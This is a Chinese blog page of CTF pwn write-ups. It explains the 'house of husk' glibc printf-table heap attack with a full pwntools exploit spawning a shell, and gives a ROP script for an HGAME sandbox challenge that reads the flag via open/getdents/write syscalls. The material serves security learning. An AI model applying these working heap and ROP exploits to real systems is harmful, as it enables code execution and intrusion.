<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="我的博客">
<meta property="og:type" content="website">
<meta property="og:title" content="study">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="我的博客">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/02/house-of-husk/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/02/house-of-husk/" class="post-title-link" itemprop="url">house of husk</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-02-02 20:23:19 / 修改时间：20:25:39" itemprop="dateCreated datePublished" datetime="2022-02-02T20:23:19+08:00">2022-02-02</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h1><p>针对printf函数的攻击，主要利用printf函数的虚表，通过篡改虚表指针执行ogg。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>printf函数在执行过程中会根据第一个格式化字符”%X”在虚表__printf_arginfo_table和__printf_function_table寻找函数指针进行执行，具体寻找过程就是__printf_arginfo_table[‘X’],找到这个指针，然后跳到这执行，只要把这里的指针改成ogg就可以getshell,修改这里的指针大致分为两种办法，一种是任一地址写，直接写这两个虚表对应地址的指针，第二个是通过堆伪造这两个虚表，第一个很好理解，主要讲一下第二个。</p>
<h2 id="伪造虚表"><a href="#伪造虚表" class="headerlink" title="伪造虚表"></a>伪造虚表</h2><p>__printf_arginfo_table和__printf_function_table这两个虚表地址储存在main_arena下面的地址中，而且和main_arena首地址很接近，在我这个glibc版本下只相差0xc30，这是伪造的第一步</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dce870 &lt;__printf_arginfo_table&gt;:	0x000000000060bb90	0x0000000000000000</span><br><span class="line">0x7ffff7dce880 &lt;buf&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce890 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8a0 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8b0 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8c0 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8d0 &lt;ttyname_buf&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8e0 &lt;getmntent_buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8f0 &lt;qfcvt_bufptr&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce900 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx &amp;main_arena</span></span><br><span class="line">0x7ffff7dcdc40 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x7ffff7dcdc50 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcdc60 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcdc70 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>要想执行这两个虚表储存的函数指针，得先找见这两个虚表地址才行，然后通过虚表地址加上偏移量得到函数地址跳进去执行，这两个虚表地址储存在固定的位置，所以只要能覆盖这两个虚表地址成堆地址，然后再相应偏移量处添上ogg就可以getshell了吗不是。</p>
<p>现在关键的就是覆盖虚表地址，网上的普遍做法是利用House of Corrosion技术。这个技术和fastbin息息相关。</p>
<h3 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a>House of Corrosion</h3><p>众所周知，fastbin链表的大小是0x20到0x80之间，但其实最大值并不是固定的，而是global_max_fast中的值决定的，一般是0x80,所以fastbin的最大值就是0x80</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dcf940 &lt;global_max_fast&gt;:	0x0000000000000080	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>所以可以通过改变这个地方的值让fasbin能接受的最大值变大，一般是利用unsortbinattack，也可以直接ufa来完成。</p>
<p>还有一个知识点就是从<code>main_arena+8</code>开始存放<code>fastbin[0x20]</code>的头指针,glibc预留了十个指针来存放fastbin的头指针，比如free的chunk是0x50,那储存这个堆地址的地址是main_arena+8+(0x50-0x20)/0x10*8也就是在main_arena+32处存放堆地址，简而言之就是main_arena+8加上偏移量处存放堆地址，这个偏移量和size正相关，当通过修改global_max_fast的值让可free的chunk的size是任意值，那我们就可以向main_arena+8后的任意一个地址填上堆地址了。</p>
<p>很有意思的攻击手段，那也就是说可以向__printf_arginfo_table和__printf_function_table中填入堆地址了，到这里攻击思路就闭环。</p>
<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>先修改global_max_fast的值，然后申请两个堆，堆的大小通过下面的公式算出，各伪造一个虚表，然后再伪造printf_arginfo_table的堆上写好ogg,然后都free掉修改虚表地址，最后调用printf完成攻击</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1.不同版本main_arena+8到__printf_arginfo_table和__printf_function_table的偏移量不同，根据偏移量确定size的值完成堆地址覆盖。</p>
<p>​               chunk_size=地址差值*2+0x20</p>
<p>2.实施前提：</p>
<p>​            1.有至少一次ufa完成global_max_fast的修改                                                                                                                                                                              </p>
<p>​            2.有prinf函数且第二个参数可控</p>
<p>例题 HWS pwn1</p>
<p>感觉这道题作为house of husk的入门题挺不错的，简直就是专门为这个利用而生,刚好有一次unsortbinatack,刚好能申请两个合法的堆，刚好有很多printf</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">fastbinY=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>+<span class="number">8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now you can get a big box, what size?\n&#x27;</span>)</span><br><span class="line">    print_arginfo_table=<span class="number">0x3ec870</span></span><br><span class="line">    printf_function_table=<span class="number">0x3f0738</span></span><br><span class="line">    chunk_size1=(print_arginfo_table-fastbinY)*<span class="number">2</span>+<span class="number">0x20</span>-<span class="number">2</span>*<span class="number">0x10</span></span><br><span class="line">    chunk_size2=(printf_function_table-fastbinY)*<span class="number">2</span>+<span class="number">0x20</span>-<span class="number">2</span>*<span class="number">0x10</span></span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(chunk_size1))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now you can get a bigger box, what size?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(chunk_size2))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Do you want to rename?(y/n)\n&#x27;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;y\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now your name is:&#x27;</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input your new name!\n&#x27;</span>)</span><br><span class="line">    global_max_fast_addr=libc_base+<span class="number">0x3ed940</span></span><br><span class="line">    sh.send(p64(<span class="number">0</span>)+p64(global_max_fast_addr-<span class="number">0x10</span>))</span><br><span class="line">    </span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;box?(1:big/2:bigger)\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Let\&#x27;s edit, &#x27;</span>)</span><br><span class="line">    ogg=libc_base+<span class="number">0x4f432</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(ogg)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    payload=<span class="string">&quot;a&quot;</span>*<span class="number">8</span>*(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>)-<span class="number">2</span>) + p64(ogg)*<span class="number">2</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/22/HGAME/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/22/HGAME/" class="post-title-link" itemprop="url">HGAME</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-01-22 21:10:53 / 修改时间：21:11:07" itemprop="dateCreated datePublished" datetime="2022-01-22T21:10:53+08:00">2022-01-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="HGAME—-PWN"><a href="#HGAME—-PWN" class="headerlink" title="HGAME—-PWN"></a>HGAME—-PWN</h1><p>感觉题目质量挺高的，目前就做了pwn1,pwn3,pwn4.pwn1是一个简单的栈溢出，重点记录一下pwn3和pwn4的攻击思路，因为是我第一次见到这种思路。（全程被ayoung和mark带）</p>
<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>题目提示反弹不了shell而且存flag的文件不叫flag,所以不能用传统的orw的rop来得到flag,沙盒里也禁用了一些函数</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/get-shell/hgame/pwn3/to_give_out$ seccomp-tools dump ./vuln</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x09 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0013</span><br><span class="line"> 0004: 0x15 0x08 0x00 0x0000003b  if (A == execve) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000101  if (A == openat) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000003  if (A == close) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000086  if (A == uselib) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x0000003a  if (A == vfork) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>有些沙盒是白名单，有些沙盒是黑名单，这个就是黑名单，可以看出禁用了execve函数不能反弹shell.</p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>不能弹shell的话就得用orw来读flag,用orw的话得先知道对面文件名才行，mark提示说用getdents函数得到文件名再用orw得到flag,getdents函数的完整攻击思路是ogw,意即用open打开文件夹，用getdents函数把文件名在写程序里，然后用write函数写出来，这是调用他们时的参数构造</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">&#x27;./&#x27;</span>,<span class="number">0x1000</span>,<span class="number">0</span>)</span><br><span class="line">getdents(句柄（<span class="number">0</span>）,地址，<span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span><br><span class="line">write(<span class="number">1</span>,地址，<span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span><br></pre></td></tr></table></figure>

<p>先通过rop调用ogw得到flag文件名，然后调用orw读flag</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process(&#x27;./vuln&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chuj.top&#x27;</span>,<span class="number">42614</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">x0000000000401443: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x0000000000401441: pop rsi; pop r15; ret; </span></span><br><span class="line"><span class="string">0x000000000040143d: pop rsp; pop r13; pop r14; pop r15; ret; </span></span><br><span class="line"><span class="string">0x000000000011c371: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">x0000000000066229: syscall; ret;</span></span><br><span class="line"><span class="string">0x000000000004a550: pop rax; ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x00000000004013DC&#x27;)</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401443</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401441</span></span><br><span class="line">main=<span class="number">0x401311</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;size?\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content?\n&#x27;</span>)</span><br><span class="line">bss_addr=<span class="number">0x404000</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(write_got)*<span class="number">2</span>+p64(write_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;done!\n&#x27;</span>)</span><br><span class="line">libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">execve_addr=libc_base+libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">binsh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011c371</span></span><br><span class="line">syscall_addr=libc_base+<span class="number">0x0000000000066229</span></span><br><span class="line">pop_rax=libc_base+<span class="number">0x000000000004a550</span></span><br><span class="line">b=<span class="string">&#x27;b *&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(syscall_addr)</span><br><span class="line"><span class="comment">#gdb.attach(sh,b)</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(execve_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;size?\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x100</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(pop_rax)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(syscall_addr)+p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;done!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#sh.send(&#x27;./\x00&#x27;)</span></span><br><span class="line">sh.send(<span class="string">&#x27;flagd44b02e91a1d1648cbfc\x00&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;size?\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rdi)+p64(bss_addr+<span class="number">0x100</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscall_addr)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x100</span>)*<span class="number">2</span>+p64(pop_rdx_r12)</span><br><span class="line">payload+=p64(<span class="number">0x300</span>)*<span class="number">2</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(syscall_addr)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x100</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0x300</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">1</span>)+p64(syscall_addr)+p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#hgame&#123;1-4dm1T~The-rop-ChA!N-M4YBE~TOoO0oooO0-l0Ng_And~$Orry_fOR_ThE~|Nc0NVenIENCE:(&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>感觉构造rop的挺好玩的</p>
<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p>程序就是spfa算法的实现，刚开始我就分析出思路了，就是利用dist进行任意读和任意写，本来打算是利用exit_hook拿shell的，改是能改成功，但是改成功后程序就异常退出了，他也不调用exit-hook啊，实现+调试+发现错误+定位错误就用了一天，晚上十二点多是在受不了就问了ayoung,他告诉我改写io虚表指针，我哪知道这是啥啊，第一次听，但是改io指针肯定是通过printf或者scanf实现的，我就进行慢慢调试程序，还真被我发现一些虚表了，mark利用io_file_jumps出了，我利用io_helper_jumps出了（四点出的）</p>
